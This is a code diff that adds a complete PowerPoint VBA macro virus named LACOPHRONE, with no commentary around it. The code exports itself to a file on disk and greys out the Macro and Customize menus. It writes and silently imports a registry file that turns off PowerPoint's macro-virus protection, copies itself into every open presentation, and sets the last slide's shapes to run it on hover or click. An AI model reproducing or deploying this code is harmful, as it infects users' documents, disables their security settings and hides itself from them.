@@ -1,0 +1,35 @@
+   Attribute VB_Name = "LACOPHRONE"
+   Sub LACO()
+   On Error Resume Next
+   With ActivePresentation.VBProject.VBComponents("LACOPHRONE")
+   .Export ("C:\CONFIG.LAC")
+   End With
+
+   With CommandBars("Tools")
+   .Controls("Macro").Enabled = 0
+   .Controls("Customize...").Enabled = 0
+   End With
+   Open "c:\power.reg" For Output As 1
+   Print #1, "REGEDIT4"
+   Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options]"
+   Print #1, """MacroVirusProtection""=dword:00000000"
+   Close 1
+   Shell "regedit /s c:\power.reg", vbHide
+   For i = 1 To Presentations.Count
+   If Presentations(i).VBProject.VBComponents(1).Name <> "LACOPHRONE" Then
+   With Presentations(i).VBProject.VBComponents
+   .Import("C:\CONFIG.LAC").Name = "LACOPHRONE"
+   End With
+   End If
+   Next
+   For Each kilo In ActivePresentation.Slides(ActivePresentation.Slides.Count).Shapes
+   With kilo.ActionSettings(ppMouseOver)
+   .Action = ppActionRunMacro
+   .Run "LACOPHRONE"
+   End With
+   With kilo.ActionSettings(ppMouseClick)
+   .Action = ppActionRunMacro
+   .Run "LACOPHRONE"
+   End With
+   Next
+   End Sub
